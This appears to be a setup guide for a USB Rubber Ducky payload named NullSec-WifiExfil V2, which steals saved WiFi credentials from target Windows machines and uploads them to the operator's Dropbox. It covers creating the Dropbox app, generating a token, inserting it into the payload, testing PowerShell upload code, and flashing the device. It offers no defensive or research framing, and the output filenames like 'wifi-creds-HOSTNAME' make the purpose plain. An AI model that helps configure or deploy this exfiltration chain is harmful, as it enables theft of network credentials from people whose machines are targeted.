# Dropbox Setup Guide - NullSec-WifiExfil V2

## 📋 Step-by-Step Dropbox Configuration (5 minutes)

This guide walks you through creating a Dropbox app and generating an access token for the WiFi exfiltration payload.

---

## Step 1: Create a Dropbox App

### 1.1 Go to Dropbox App Console
- Navigate to: https://www.dropbox.com/developers/apps
- Click **"Create app"** button (top-right)

### 1.2 Choose App Type
- **API:** Select **"Scoped access"**
- **Type:** Select **"Full Dropbox"** (gives access to all files)
- Click **"Next"**

### 1.3 Name Your App
- Enter app name: `WifiExfil` (or any name you prefer)
- Accept terms
- Click **"Create app"**

### 1.4 App Console Overview
You should now see your app dashboard with:
- App name
- App key & App secret
- Settings tab
- Permissions tab
- OAuth 2 section

---

## Step 2: Configure Permissions

### 2.1 Set Permissions
1. Click **"Permissions"** tab
2. Under **"File and folder"** section, enable:
   - ✅ `files.metadata.write` (to create files)
   - ✅ `files.content.write` (to upload file contents)
   - ✅ `files.content.read` (optional, for verification)
3. Click **"Submit"** (if required)

### 2.2 Verify Changes Applied
- Should show "Applied" or "Pending" status
- Changes may take a few seconds to apply

---

## Step 3: Generate Access Token

### 3.1 Create Access Token
1. Click **"Settings"** tab
2. Scroll to **"OAuth 2"** section
3. Click **"Generate"** (under "Generated access token")
4. A token appears: `sl.A2xK9z...` (long string)

### 3.2 Copy and Save Token
- ✅ **Copy the full token** (it's long, like 100+ characters)
- ⚠️ **Save it securely** - you'll only see it once
- If you lose it, generate a new one

**Example token format:**
```
sl.A2xK9z_B1vQ3hT5mN8oP0rXyZ9aB2cD3eF4gH5iJ6kL7nM8oP9qR0sT1uV2wX3yZ4
```

---

## Step 4: Configure the Payload

### 4.1 Edit payload-dropbox.txt
Open the file in a text editor and find:
```
DEFINE #DROPBOX_TOKEN YOUR_DROPBOX_ACCESS_TOKEN_HERE
DEFINE #DROPBOX_PATH /payloads/wifi-logs
```

### 4.2 Replace with Your Token
```
DEFINE #DROPBOX_TOKEN sl.A2xK9z_B1vQ3hT5mN8oP0rXyZ9aB2cD3eF4gH5iJ6kL7nM8oP9qR0sT1uV2wX3yZ4
DEFINE #DROPBOX_PATH /payloads/wifi-logs
```

### 4.3 Choose Your Export Path
Change `#DROPBOX_PATH` to where you want files saved:
- `/payloads/wifi-logs` ← default (creates folder in Dropbox root)
- `/MyFolder/logs` ← custom location
- `/` ← Dropbox root (not recommended)

**Note:** The payload automatically:
- Creates the folder if it doesn't exist
- Generates filename: `wifi-creds-HOSTNAME-TIMESTAMP.txt`
- Example: `wifi-creds-DESKTOP-ABC123-2026-05-07_14-23-45.txt`

---

## Step 5: Test Your Setup

### 5.1 Test Token Validity
Before flashing to your Ducky, test the token with PowerShell:

```powershell
# Test 1: Check token works
$token = 'YOUR_TOKEN_HERE'
$headers = @{'Authorization' = "Bearer $token"}
$test = Invoke-RestMethod -Uri 'https://www.dropboxapi.com/2/users/get_current_account' -Headers $headers
if ($test) { Write-Host "✓ Token is valid!" } else { Write-Host "✗ Token failed" }
```

### 5.2 Test File Upload
```powershell
# Test 2: Try uploading a test file
$token = 'YOUR_TOKEN_HERE'
$testContent = "Test from PowerShell $(Get-Date)"
$headers = @{
    'Authorization' = "Bearer $token"
    'Content-Type' = 'application/octet-stream'
    'Dropbox-API-Arg' = '{"path":"/test-upload.txt","mode":"add"}'
}
Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' `
    -Method Post -Headers $headers -Body $testContent

Write-Host "Check your Dropbox for test-upload.txt"
```

**✓ If successful:**
- Token is valid
- Permissions are correct
- You can proceed to flash the payload

**✗ If it fails:**
- See [TROUBLESHOOTING.md](./TROUBLESHOOTING.md)

---

## Step 6: Flash to USB Rubber Ducky

1. Use official Ducky Flasher tool
2. Select `payload-dropbox.txt`
3. Flash to your Ducky
4. Eject and test on target Windows machine

---

## File Output Location

After execution, check your Dropbox:

```
Dropbox Root/
├── payloads/
│   └── wifi-logs/
│       ├── wifi-creds-DESKTOP-ABC123-2026-05-07_14-23-45.txt
│       ├── wifi-creds-DESKTOP-XYZ789-2026-05-07_15-10-22.txt
│       └── ...
```

---

## Token Security Best Practices

⚠️ **Important:**

1. **Treat token like a password** - anyone with it can access your files
2. **Use dedicated Dropbox account** - don't use your main personal account
3. **Rotate tokens regularly** - regenerate every 30-90 days
4. **Revoke if compromised** - delete in Dropbox console immediately
5. **Store securely** - don't share or commit to public repos
6. **Use limited permissions** - only grant what's needed

### How to Revoke a Token
1. Go to https://www.dropbox.com/developers/apps
2. Select your app
3. Click **Settings**
4. Find your token under **Generated access tokens**
5. Click **Revoke** next to the token

---

## Troubleshooting

If something doesn't work, see [TROUBLESHOOTING.md](./TROUBLESHOOTING.md) for:
- 401 Unauthorized errors
- Permission denied errors
- File upload failures
- Network connectivity issues

---

## Dropbox App Console Reference

| Item | Location | Purpose |
|------|----------|----------|
| App Key | Settings tab | Identifies your app |
| App Secret | Settings tab | Don't share this |
| Access Token | OAuth 2 section | Use in payload |
| Permissions | Permissions tab | Control what app can do |
| Token Revocation | OAuth 2 section | Disable/delete tokens |

---

**You're ready! Your Dropbox setup is complete.**
